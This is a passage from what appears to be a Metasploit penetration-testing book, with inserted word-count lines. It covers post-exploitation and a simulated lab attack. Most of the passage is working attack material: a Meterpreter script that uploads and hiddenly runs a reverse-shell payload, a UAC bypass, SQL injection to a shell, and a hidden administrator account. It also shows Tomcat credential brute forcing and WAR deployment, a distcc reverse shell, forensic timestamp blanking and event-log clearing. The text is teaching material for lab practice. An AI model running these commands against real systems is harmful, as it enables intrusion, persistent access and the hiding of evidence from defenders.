        execute_payload = "#{tempdir}\\#{filename}"
       pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})
[Word Count: 46]

# Meterpreter script for uploading and executing another meterpreter exe
[Word Count: 10]

info = "Simple script for uploading and executing an additional meterpreter payload"
[Word Count: 12]

opts = Rex::Parser::Arguments.new(
       "-h"  => [ false,   "This help menu. Spawn a meterpreter shell by uploading and 
executing."],
       "-r"  => [ true,    "The IP of a remote Metasploit listening for the connect back"],
       "-p"  => [ true,    "The port on the remote host where Metasploit is listening 
(default: 4444)"]
)
[Word Count: 50]

filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4444
lhost    = "127.0.0.1"
pay      = nil
[Word Count: 17]

opts.parse(args) do |opt, idx, val|
       case opt
       when "-h"
              print_line(info)
              print_line(opts.usage)
              raise Rex::Script::Completed
[Word Count: 13]

when "-r"
              rhost = val
       when "-p"
              rport = val.to_i
[Word Count: 10]

payload = "windows/meterpreter/reverse_tcp"
       pay = client.framework.payloads.create(payload)
       pay.datastore['LHOST'] = rhost
       pay.datastore['LPORT'] = rport
       mul = client.framework.exploits.create("multi/handler")
       mul.share_datastore(pay.datastore)
       mul.datastore['WORKSPACE'] = client.workspace
       mul.datastore['PAYLOAD'] = payload
       mul.datastore['EXITFUNC'] = 'process'
       mul.datastore['ExitOnSession'] = true
       print_status("Running payload handler")
       mul.exploit_simple(
              'Payload'  => mul.datastore['PAYLOAD'],
              'RunAsJob' => true
       )
[Word Count: 39]

tempdir = client.fs.file.expand_path("%TEMP%")
       print_status("Uploading meterpreter to temp directory")
        raw = pay.generate
        exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
       tempexe = tempdir + "\\" + filename
        tempexe.gsub!("\\\\", "\\")
       fd = client.fs.file.new(tempexe, "wb")
       fd.write(exe)
       fd.close
       print_status("Executing the payload on the system")
       execute_payload = "#{tempdir}\\#{filename}"
       pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})
[Word Count: 46]

Now that we have our newly created Meterpreter script, let’s launch 
Metasploit, get into Meterpreter, and execute the script:
[Word Count: 19]

meterpreter > run execute_upload -r 172.16.32.129 -p 443
[*] Running payload handler
[*] Uploading meterpreter to temp directory
[*] Executing the payload on the system
[*] Sending stage (749056 bytes) to 172.16.32.170
[*] Meterpreter session 2 opened (172.16.32.129:443 -> 172.16.32.170:1140) at 
Tue Nov 30 23:24:19 -0500 2010
meterpreter >
[Word Count: 49]

In this example, we use the post exploitation modules, which can be 
used to bypass UAC. We first start the multi/handler module with the -j flag, 
which allows us to accept multiple Meterpreter shells. Notice in this example 
that when we try to run the getsystem command, it fails because it is being 
blocked by Windows UAC.
[Word Count: 57]

resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 0.0.0.0:443
[*] Starting the payload handler...
[*] Sending stage (749056 bytes) to 172.16.32.130
[*] Meterpreter session 1 opened (172.16.32.128:443 -> 172.16.32.130:2310) at 
Thu June 09 08:02:45 -0500 2011
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter > sysinfo
Computer: DAVE-DEV-PC
OS      : Windows 7 (Build 7600).
Arch    : x64 (Current Process is WOW64)
Language: en_US
meterpreter >
[Word Count: 89]

Notice that we can’t bridge over to a system-level account, because UAC 
is blocking us. We need to get around UAC to obtain system-level privileges 
and ultimately become an administrator so that we can further compromise 
the machine. We press CTRL-Z to back out, keeping the session active. Then 
we use the new format to run post modules and bypass the Windows UAC 
functionality.
[Word Count: 64]

msf exploit(handler) > use post/windows/escalate/bypassuac
msf post(bypassuac) > show options
Module options (post/windows/escalate/bypassuac):
[Word Count: 13]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   LHOST                     no        Listener IP address for the new session
   LPORT    4444             no        Listener port for the new session
   SESSION                   yes       The session to run this module on.
[Word Count: 36]

msf post(bypassuac) > set LHOST 172.16.32.128
LHOST => 172.16.32.128
msf post(bypassuac) > set SESSION 1
SESSION => 1
msf post(bypassuac) > exploit
[Word Count: 22]

[*] Started reverse handler on 172.16.32.128:4444
[*] Starting the payload handler...
[*] Uploading the bypass UAC executable to the filesystem...
[Word Count: 20]

[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Uploaded the agent to the filesystem....
[*] Post module execution completed
msf post(bypassuac) >
[*] Sending stage (749056 bytes) to 172.16.32.130
[*] Meterpreter session 2 opened (172.16.32.128:4444 -> 172.16.32.130:1106) at Thu June 09
19:50:54 -0500 2011
[*] Session ID 2 (172.16.32.128:4444 -> 172.16.32.130:1106) processing InitialAutoRunScript
'migrate -f'
[*] Current server process: tYNpQMP.exe (3716)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 3812
[*] New server process: notepad.exe (3812)
[Word Count: 81]

msf post(bypassuac) > sessions -i 2
[*] Starting interaction with 2...
[Word Count: 11]

meterpreter > getsystem
...got system (via technique 1).
meterpreter >
[Word Count: 10]

root@bt:/opt/framework3/msf3# nano modules/post/windows/escalate/bypassuac.rb
[Word Count: 3]

We won’t cover all the details of the post exploitation module because it 
is nearly identical to the attack shown in Chapter 13. Carefully walk through 
each line, and then try to build and run your own module.
Walk through existing Meterpreter scripts and look at the different com-
mands, calls, and functions that can be used to create your own script. If you 
come up with a great idea for a new script, submit it to the Metasploit devel-
opment team—who knows; it might be a script that others can use!
[Word Count: 92]

S I M U L A T E D  P E N E T R A T I O N  T E S T
[Word Count: 24]

Penetration testing is the pinnacle for most of us, and 
successfully bypassing an organization’s defenses dur-
ing a penetration test is one of our most rewarding 
experiences. In this chapter, we’ll pull together what 
you’ve learned in previous chapters as we simulate a 
complete penetration test. You will be re-creating steps 
that you’ve seen in previous chapters, so most of what 
is shown here should be familiar.
[Word Count: 67]

Before you begin, download and install Metasploit’s vulnerable Linux 
virtual machine called Metasploitable. (You can find it at http://www.thepiratebay
.org/torrent/5573179/Metasploitable/.) Metasploitable was created to train indi-
viduals to use Metasploit for successful exploitation. Follow the directions on 
the site to install Metasploitable, and then power it on. We’ll be running the
[Word Count: 51]

Metasploitable virtual machine alongside the Windows XP system to simulate 
a small networked environment, with one virtual machine acting as an Inter-
net-facing system and another acting as an internal network host.
[Word Count: 32]

NOTE
The simulated penetration test in this chapter is a small one. You would do something 
more in-depth if your target were a large corporation. We’ve kept this simple to make it 
easy for you to replicate.
[Word Count: 37]

Starting Nmap 5.21 ( http://nmap.org ) at 2011-05-22 23:29 EDT
Nmap scan report for 172.16.32.131
Host is up (0.00071s latency).
[Word Count: 20]

Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
[Word Count: 11]

Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds
[Word Count: 12]

We discover what appears to be a web server running on this server. 
This is typical when attacking Internet-facing systems, most of which will limit 
the ports accessible by Internet users. In this example, we find port 80, the 
standard HTTP port, listening. If we browse to it, we see something similar 
to Figure 17-1.
[Word Count: 55]

Figure 17-1: A web application was identified.
[Word Count: 7]

single quote) into the username field and a single quote in the password 
field. Prior to submitting the form, our username and password fields should 
look like those in Figure 17-2.
[Word Count: 31]

Figure 17-2: Attempting to leverage SQL injection
[Word Count: 7]

Figure 17-3: Error message: SQL injection is present.
[Word Count: 8]

When we looked for vulnerabilities in the web application, we found a viable 
attack vector via SQL injection. In this instance, Fast-Track is our best option 
for compromising the MS SQL server and gaining access to our target through 
Meterpreter, because, as you’ll recall from Chapter 11, it attacks Microsoft 
SQL–based injection vulnerabilities with ease.
After we have a Meterpreter console, we’ll look at how to gain access to 
the Metasploitable system on the internal network.
[Word Count: 76]

We’ll use SQLPwnage to deploy the Meterpreter console via SQL injection 
on the target to gain administrative access to its backend database. Recall 
from Chapter 11 that SQLPwnage is an automated way of attacking MS SQL–
based injection flaws, and it uses multiple methods of attack in an attempt to 
fully compromise the SQL server via the xp_cmdshell stored procedure.
[Word Count: 60]

Before launching the attack, we need to set up some options through 
msfconsole. For practice, let’s create our own Metasploit listener manually. 
Fast-Track can set it up for you, but we will be adding the load auto_add_route X 
function within Metasploit so that we can automatically connect to systems 
on the internal network. We’ll create a listener and launch Fast-Track to attack 
the system.
[Word Count: 64]

root@bt:/opt/framework3/msf3# msfconsole
msf > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.32.129
LHOST => 172.16.32.129
smsf exploit(handler) > set LPORT 443
LPORT => 443
X exploit(handler) > load auto_add_route
[*] Successfully loaded plugin: auto_add_route
msf exploit(handler) > exploit -j
[*] Exploit running as background job.
[*] Started reverse handler on 172.16.32.129:443
[*] Starting the payload handler...
msf exploit(handler) >
[Word Count: 68]

With our listener waiting for a connection from our soon-to-be compro-
mised target, we launch Fast-Track. (When the xterm window opens, close it 
since we already have a listener set up.)
[Word Count: 31]

[+] Conversion from hex to binary in progress. [+]
[+] Conversion complete. Moving the binary to an executable. [+]
[+] Splitting the hex into 100 character chunks [+]
[+] Split complete. [+]
[Word Count: 32]

[+] Prepping the payload for delivery. [+]
Sending chunk 1 of 8, this may take a bit...
Sending chunk 2 of 8, this may take a bit...
[Word Count: 27]

Using H2B Bypass to convert our Payload to Binary..
Running cleanup before launching the payload....
[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]
[Word Count: 29]

This should look familiar. We’ve essentially attacked the web application 
through Fast-Track and exploited it via SQL injection attacks. We used the 
xp_cmdshell stored procedure and the binary-to-hex conversion technique to 
present a full-fledged Meterpreter shell.
[Word Count: 36]

meterpreter > run getgui -e -f 8080
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*] RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] Terminal Services service is already set to auto
[*] Opening port in local firewall if necessary
[*] Starting the port forwarding at local port 8080
[*] Local TCP relay created: 0.0.0.0:8080 <-> 127.0.0.1:3389
meterpreter > shell
[Word Count: 73]

Process 2480 created.
Channel 6 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 16]

C:\WINDOWS\system32>net user msf metasploit /add
net user msf metasploit /ADD
The command completed successfully.
C:\WINDOWS\system32>net localgroup administrators msf /add
net localgroup administrators msf /add
The command completed successfully.
C:\WINDOWS\system32>
C:\WINDOWS\system32>^Z
Background channel 6? [y/N]  y
meterpreter > upload nmap.exe
[*] uploading  : nmap.exe -> nmap.exe
[*] uploaded   : nmap.exe -> nmap.exe
meterpreter >
[Word Count: 53]

We now have our launching pad for additional attacks. With nmap installed 
on the target, we are essentially sitting on the internal network. We can now 
attempt to enumerate internally connected systems and further penetrate 
the network.
[Word Count: 37]

With our Meterpreter session granting us access to the internal network via 
the load auto_add_route command, we can scan and exploit the inside hosts 
using the compromised Windows XP target as the launching point. We’re 
effectively connected to the internal network, so we should be able to reach 
our Metasploitable system. Let’s begin with a basic port scan.
[Word Count: 58]

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.1
|_ftp-bounce: no banner
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
|_html-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB
[Word Count: 88]

8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_html-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
MAC Address: 00:0C:29:39:12:B2 (VMware)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
Network Distance: 1 hop
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux
[Word Count: 54]

Host script results:
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Name: WORKGROUP\Unknown
|_  System time: 2010-05-21 22:28:01 UTC-4
[Word Count: 29]

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds
[Word Count: 25]

Here we see a series of open ports. Based on nmap’s OS detection we 
see that the scanned system is a UNIX/Linux variant of some sort. Some of 
these ports should jump out at you, such as FTP, Telnet, HTTP, SSH, Samba, 
MySQL, PostgreSQL, and Apache.
[Word Count: 46]

Because a few ports look interesting, we’ll start banner-grabbing each one to 
try to find a way into the system.
[Word Count: 20]

msf > use auxiliary/scanner/ftp/ftp_version
msf auxiliary(ftp_version) > set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(ftp_version) > run
[Word Count: 17]

[*] 172.16.32.162:21 FTP Banner: '220 ProFTPD 1.3.1 Server (Debian) [::ffff:172.16.32.162]\x0d\x0a'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ftp_version) >
[Word Count: 26]

Exiting the system, we know now that ProFTPD 1.3.1 is running on port 21. 
Next we use SSH to learn more about the target. (The addition of the -v flag 
gives us verbose output.) The next listing tells us that our target is running 
an older version of OpenSSH, specifically written for Ubuntu:
[Word Count: 53]

msf > ssh 172.16.32.162 -v
[*] exec: ssh 172.16.32.162 –v
[Word Count: 10]

OpenSSH_5.1p1 Debian-3ubuntu1, OpenSSL 0.9.8g 19 Oct 2007
[Word Count: 7]

Now we issue the following to determine the version of Ubuntu running 
on this system:
[Word Count: 15]

msf auxiliary(telnet_version) > set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(telnet_version) > run
[Word Count: 13]

[*] 172.16.32.162:23 TELNET Ubuntu 8.04\x0ametasploitable login:
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(telnet_version) >
[Word Count: 22]

Great! We know that the system is running Ubuntu 8.04 and that two 
unencrypted protocols (telnet and FTP) are in use that might come into play 
later.
Now let’s look at SMTP to see what version our target is running. Remem-
ber that we are trying to identify the running versions of the services operat-
ing on the various remote systems.
[Word Count: 61]

msf > use auxiliary/scanner/smtp/smtp_version 
msf auxiliary(smtp_version) > set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(smtp_version) > run
[Word Count: 17]

[*] 172.16.32.162:25 SMTP 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\x0d\x0a
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smtp_version) >
[Word Count: 24]

As you can see, the Postfix mail server appears to be running on the 
Metasploitable server.
This process is continued through all the different ports that have been 
discovered as listening on our target. The various auxiliary modules are very 
useful for this work. When you’re finished, you should have a list of the ver-
sions of software running on the system, information that you will use when 
targeting attacks.
[Word Count: 70]

service.) After some more research on the operating version number of 
the Apache Tomcat installation running on the target, the Tomcat manager 
seemed the best route for compromising the system. If we can get through 
Tomcat’s manager function, we can use the HTTP PUT method to deploy our 
payload on the vulnerable system. We launch the attack as follows (with the 
list of exploits and payloads snipped):
[Word Count: 67]

msf > search apache
[*] Searching loaded modules for pattern 'apache'...
[Word Count: 11]

msf auxiliary(tomcat_mgr_login) > set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
smsf auxiliary(tomcat_mgr_login) > set THREADS 50
THREADS => 50
msf auxiliary(tomcat_mgr_login) > set RPORT 8180
RPORT => 8180
msf auxiliary(tomcat_mgr_login) > set VERBOSE false
VERBOSE => false
emsf auxiliary(tomcat_mgr_login) > run
[Word Count: 40]

[+] http://172.16.32.162:8180/manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] 
successful login 'tomcat' : 'tomcat'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(tomcat_mgr_login) >
[Word Count: 27]

Our brute force attack is successful, and it logs in with the username 
tomcat and password tomcat. But we don’t yet have a shell.
With our newly discovered credentials, we leverage Apache’s HTTP PUT 
functionality with the multi/http/tomcat_mgr_deploy exploit to place our pay-
load on the system using the valid username and password that we discovered 
by brute-forcing the login.
[Word Count: 60]

auxiliary(tomcat_mgr_login) > use multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy) > set password tomcat
password => tomcat
msf exploit(tomcat_mgr_deploy) > set username tomcat
username => tomcat
msf exploit(tomcat_mgr_deploy) > set RHOST 172.16.32.162
RHOST => 172.16.32.162
msf exploit(tomcat_mgr_deploy) > set LPORT 9999
LPORT => 9999
Msf exploit(tomcat_mgr_deploy) > set RPORT 8180
RPORT => 8180
msf exploit(tomcat_mgr_deploy) > set payload linux/x86/shell_bind_tcp
payload => linux/x86/shell_bind_tcp
msf exploit(tomcat_mgr_deploy) > exploit
[*] Using manually select target "Linux X86"
[*] Uploading 1669 bytes as FW36owipzcnHeUyIUaX.war ...
[*] Started bind handler
[Word Count: 80]

[*] Executing /FW36owipzcnHeUyIUaX/UGMIdfFjVENQOp4VveswTlma.jsp...
[*] Undeploying FW36owipzcnHeUyIUaX ...
[*] Command shell session 1 opened (172.16.32.129:43474 -> 172.16.32.162:9999) at 2010-05-
21 23:57:47 -0400msf 
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
whoami
tomcat55
ls /root
reset_logs.sh
mkdir /root/moo.txt
mkdir: cannot create directory '/root/moo.txt': Permission denied
[Word Count: 58]

Notice that we cannot write to the root folder, because we’re running 
from a limited user account and this folder requires root-level permissions. 
Usually, Apache runs under the Apache user account, which is sometimes 
apache but which can also be httpd, www-data, among other names. Based on 
what we know about the operating system version in use on the target, we 
could use local privilege escalation techniques to gain further access as root. 
Because we already have some basic access, let’s try a couple of different attacks.
[Word Count: 87]

NOTE
Here’s a little hint in obtaining root access to Metasploitable, without privilege escalation: 
Check out http://www.exploit-db.com/exploits/5720/ for the SSH predictable 
PRNG exploit.
[Word Count: 23]

When we performed only the default nmap port scan, we did not include all 
possible ports. Because we have now gained initial access to the system, we 
enter netstat -antp, and we notice other ports that nmap did not scan for
[Word Count: 41]

when performing the attack. (Remember that in a penetration test we can’t 
always rely on the defaults to be successful.)
Our scan finds that port 3632 is open and associated with DistCC. An 
online search tells us that DistCC is a program that distributes builds of C/C++ 
code to several machines across a network, and it is vulnerable to an attack. 
(When performing penetration tests, you will often encounter unfamiliar 
applications and products, and you will need to research the application before 
you can attack it.)
[Word Count: 86]

msf exploit(distcc_exec) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(distcc_exec) > set LHOST 172.16.32.129
LHOST => 172.16.32.129
shomsf exploit(distcc_exec) > set RHOST 172.16.32.162
RHOST => 172.16.32.162
msf exploit(distcc_exec) > show payloads
[Word Count: 32]

Name                   Rank    Description
   ----                   ----    -----------
   cmd/unix/bind_perl     normal  Unix Command Shell, Bind TCP (via perl)
   cmd/unix/bind_ruby     normal  Unix Command Shell, Bind TCP (via Ruby)
   cmd/unix/generic       normal  Unix Command, Generic command execution
   cmd/unix/reverse       normal  Unix Command Shell, Double reverse TCP (telnet)
   cmd/unix/reverse_perl  normal  Unix Command Shell, Reverse TCP (via perl)
   cmd/unix/reverse_ruby  normal  Unix Command Shell, Reverse TCP (via Ruby)
[Word Count: 58]

msf exploit(distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(distcc_exec) > exploit
[Word Count: 13]

[*] Started reverse double handler
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo q6Td9oaTrOkXsBXS;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "q6Td9oaTrOkXsBXS\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (172.16.32.129:4444 -> 172.16.32.162:47002) at 2010-05-
22 00:08:04 -0400
[Word Count: 63]

whoami
daemon
mkdir /root/moo
mkdir: cannot create directory '/root/moo': Permission denied
[Word Count: 11]

Notice above that we are still not at root. A local privilege exploit will 
further compromise the system and give full root access. We won’t tell you 
the answer here; use what you’ve learned in this book to gain root privileges 
successfully on the Metasploitable system. One hint is that you can find the 
exploit at Exploits Database (http://www.exploit-db.com/). Try getting a root 
Linux/Meterpreter shell on the system on your own.
[Word Count: 71]

-a <opt>  Set the "last accessed" time of the file
    -b        Set the MACE timestamps so that EnCase shows blanks
    -c <opt>  Set the "creation" time of the file
    -e <opt>  Set the "mft entry modified" time of the file
    -f <opt>  Set the MACE of attributes equal to the supplied file
    -h        Help banner
    -m <opt>  Set the "last written" time of the file
    -r        Set the MACE timestamps recursively on a directory
    -v        Display the UTC MACE values of the file
    -z <opt>  Set all four attributes (MACE) of the file
[Word Count: 93]

meterpreter > timestomp C:\\boot.ini -b
[*] Blanking file MACE attributes on C:\boot.ini
meterpreter >
[Word Count: 14]

In this example, we changed the timestamp so that when Encase (a popular 
forensics analysis tool) is used, the timestamps are blank.
The tool event_manager will modify event logs so that they don’t show any 
information that might reveal that an attack occurred. Here it is in action:
[Word Count: 48]

meterpreter > run event_manager
Meterpreter Script for Windows Event Log Query and Clear.
[Word Count: 13]

-c <opt>  Clear a given Event Log (or ALL if no argument specified)
    -f <opt>  Event ID to filter events on
    -h        Help menu
    -i        Show information about Event Logs on the System and their configuration
    -l <opt>  List a given Event Log.
    -p        Supress printing filtered logs to screen
    -s <opt>  Save logs to local CSV file, optionally specify alternate folder in which to 
save logs
[Word Count: 67]

meterpreter > run event_manager -c
[-] You must specify an eventlog to query!
[*] Application:
[*] Clearing Application
[*] Event Log Application Cleared!
[*] MailCarrier 2.0:
[*] Clearing MailCarrier 2.0
[*] Event Log MailCarrier 2.0 Cleared!
[*] Security:
[*] Clearing Security
[*] Event Log Security Cleared!
[*] System:
[*] Clearing System
[*] Event Log System Cleared!
meterpreter >
[Word Count: 58]

C O N F I G U R I N G  Y O U R  
T A R G E T M A C H I N E S
[Word Count: 29]

The best way to learn to use the Metasploit Framework 
is by practicing—repeating a task until you fully under-
stand how it is accomplished. This appendix explains 
how to set up a test environment to use with the exam-
ples in this book.
[Word Count: 43]

The examples in this book use a combination of Back|Track, Ubuntu 9.04, 
Metasploitable, and Windows XP. Back|Track serves as our vehicle for exploi-
tation, and the Ubuntu and Windows systems are our target systems.
First create an unpatched Windows XP Service Pack 2 installation to test the 
examples presented throughout this book. The Back|Track and Ubuntu 9.04 
virtual machines can be run on a host machine running Windows, Mac OS X, 
or Linux on any VMware product, including Workstation, Server, Player, 
Fusion, or ESX.
[Word Count: 84]

NOTE
Be careful with your Ubuntu and Windows XP virtual machines, because these systems 
are vulnerable and easy to exploit. Do not conduct any sensitive activities on these 
machines: If you can exploit them, anyone else can, too.
[Word Count: 38]

NOTE
Download Back|Track from http://www.backtrack-linux.org/ and Ubuntu 9.04 
from http://www.vmware.com/appliances/directory/ by searching for Ubuntu 
9.04. Metasploitable can be downloaded from http://blog.metasploit.com/2010/
05/introducing-metasploitable.html.
[Word Count: 22]

After powering on either of the Linux virtual machines, you need to log in. 
The default credentials for both Linux environments are username root and 
password toor.
If you don’t have a DHCP server on your network, find your system’s 
address range and use the commands shown in the following listing. (Make 
sure that you replace your IP address with an unused one, and edit the net-
work interface that you will be using. For more on manual network setup, see 
http://www.yolinux.com/TUTORIALS/LinuxTutorialNetworking.html.)
[Word Count: 82]

root@bt:~# nano /etc/network/interfaces
Password: 
<inside the nano editor place your valid information into the system>
# The primary network interface
auto eth0 # the interface used 
iface eth0 inet static # configure static IP address
      address 192.168.1.10 # your IP address you want
      netmask 255.255.255.0 # your subnet mask
      network 192.168.1.0 # your network address
      broadcast 192.168.0.255 # your broadcast address
      gateway 192.168.1.1 # your default gateway
<control-x>
<y>
[Word Count: 69]

After configuration is complete, your Linux environment should be 
ready for use. Do not update the Ubuntu installation, because this system 
should remain vulnerable.
[Word Count: 24]

Setting Up a Vulnerable Windows XP Installation
[Word Count: 7]

Configuring Your Web Server on Windows XP
[Word Count: 7]

To make things interesting and provide for a larger attack surface, we’ll 
enable some additional services.
[Word Count: 16]

1.
In the Control Panel, select Add or Remove Programs, and then select 
Add/Remove Windows Components. You should be looking at the 
Windows Components Wizard.
[Word Count: 25]

2.
Select the checkbox for Internet Information Services (IIS) and click 
Details. Then select the checkbox for File Transfer Protocol (FTP) Service 
and click OK. Conveniently enough, the FTP service allows anonymous 
connections by default.
[Word Count: 35]

3.
Select the Management and Monitoring Tools checkbox and click OK. 
By default, this installs the Simple Network Management Protocol (SNMP) 
and Windows Management Interface (WMI) SNMP Provider.
[Word Count: 28]

4.
Click Next to complete the installation and reboot the machine for good 
measure.
[Word Count: 14]

The combination of these steps adds different services that we test through-
out this book. The IIS server will allow you to run a website and can be down-
loaded from http://www.secmaniac.com/files/nostarch1.zip. The FTP service will 
allow you to perform FTP-based attacks against the Windows system, and the 
SNMP configuration will allow you to test auxiliary modules within Metasploit.
[Word Count: 59]

Many database modules within Metasploit and Fast-Track target Microsoft 
SQL Server, so you need to install SQL Server 2005 Express, available for free 
from Microsoft. As of this writing, you can locate the non–service pack version 
of SQL Server Express at http://www.microsoft.com/. To install SQL Server 
Express, you will need to install Windows Installer 3.1 and the .NET Frame-
work 2.0. You can find links to the resources on this page, and all other URLs 
referenced in this book, at http://www.secmaniac.com/files/nostarch1.zip.
[Word Count: 81]

Once you have the prerequisites installed, run the SQL Express installer 
and select all the defaults except for Authentication Mode. Select Mixed Mode, 
set a sa login password of password1, and then continue with the installation.
With the basic installation of SQL Server complete, you need to make a 
few more changes to make it accessible on your network:
[Word Count: 59]

1.
Select StartAll ProgramsMicrosoft SQL Server 2005Configuration 
Tools, and then select SQL Server Configuration Manager.
[Word Count: 15]

2.
When the Configuration Manager starts, select SQL Server 2005 Services, 
right-click SQL Server (SQLEXPRESS), and select Stop.
[Word Count: 18]

3.
Expand SQL Server 2005 Network Configuration Manager and select 
Protocols for SQLEXPRESS, as shown in Figure A-1.
[Word Count: 18]

4.
Double-click TCP/IP, and on the Protocol tab, set Enabled to Yes and 
Listen All to No.
[Word Count: 17]

5.
Next, while still within the TCP/IP Properties dialog, select the IP Addresses 
tab and remove any entries under IPAll. Under IP1 and IP2, remove the 
values for TCP Dynamic Ports and set Active and Enabled for each of 
them to Yes.
[Word Count: 42]

6.
Finally, set the IP1 IP Address to match your static IP address set earlier, 
set the IP2 address to 127.0.0.1, and set the TCP port for each of them 
to 1433. Your settings should look similar to those shown in Figure A-2. 
Click OK when you are all set.
[Word Count: 50]

Next, you’ll need to enable the SQL Server Browser service:
[Word Count: 10]

1.
Select SQL Server 2005 Services and double-click SQL Server Browser.
[Word Count: 11]

2.
On the Service tab, set the Start Mode to Automatic.
[Word Count: 11]

Figure A-2: Setting SQL Server IP addresses in the TCP/IP 
Properties dialog
[Word Count: 12]

Microsoft Windows XP [Version 5.1.2600]
© Copyright 1985-2001 Microsoft Corp.
[Word Count: 10]

C:\Documents and Settings\Administrator>netstat -ano |find "1433"
   TCP      127.0.0.1:1433          0.0.0.0:0   LISTENING   512
   TCP      192.168.1.155:1433      0.0.0.0:0   LISTENING   512
C:\Documents and Settings\Administrator>netstat -ano |find "1434"
   UDP      0.0.0:1434        *:*
C:\Documents and Settings\Administrator>
[Word Count: 28]

To use some of the more advanced features of Metasploit and external tools 
such as Fast-Track and the Social-Engineer Toolkit (SET), you will need a 
vulnerable web application to test against. To create the database and tables, 
download and install SQL Server Management Studio Express from the link 
provided at http://www.nostarch.com/metasploit.htm.
After the installation and a healthy reboot, do the following:
[Word Count: 61]

1.
Start the application by choosing StartAll ProgramsMicrosoft SQL 
Server 2005SQL Server Management Studio Express.
[Word Count: 15]

2.
When prompted for credentials, select SQL Server Authentication from 
the Authentication drop-down, and log in using the username sa and the 
password password1.
[Word Count: 24]

3.
In Object Explorer, right-click Databases and select New Database.
[Word Count: 10]

4.
For the Database name, enter WebApp and click OK.
[Word Count: 10]

5.
Expand Databases and the WebApp database tree.
[Word Count: 8]

6.
Right-click Tables and select New Table. Name your new table users with 
the column names and types shown in Figure A-3.
[Word Count: 22]

7.
Save the users table, and then right-click it and select Open Table.
[Word Count: 13]

8.
Populate the table with some sample data similar to that shown in 
Figure A-4, and then save your work.
[Word Count: 20]

9.
Expand the Security tree under Object Explorer, and then expand Logins.
[Word Count: 12]

10. Right-click Logins in the User Properties window and select New Login. 
In the Login-New window, click Search, enter ASPNET, and then click 
Check Names. The full username should automatically populate. Click 
OK to exit the user search.
[Word Count: 38]

11. Finally, while still in the User Properties window, select User Mapping, 
select the check box next to WebApp, select the db_owner role member-
ship, and then click OK.
[Word Count: 29]

That takes care of the entire configuration required on the SQL backend 
for the web application. Save and exit Management Studio.
All that remains is to create the website to interact with the database you 
created. Let’s do that now:
[Word Count: 40]

1.
Download the vulnerable web application from http://www.nostarch.com/
metasploit.htm and extract the contents of the archive to C:\Inetpub\wwwroot\.
[Word Count: 18]

2.
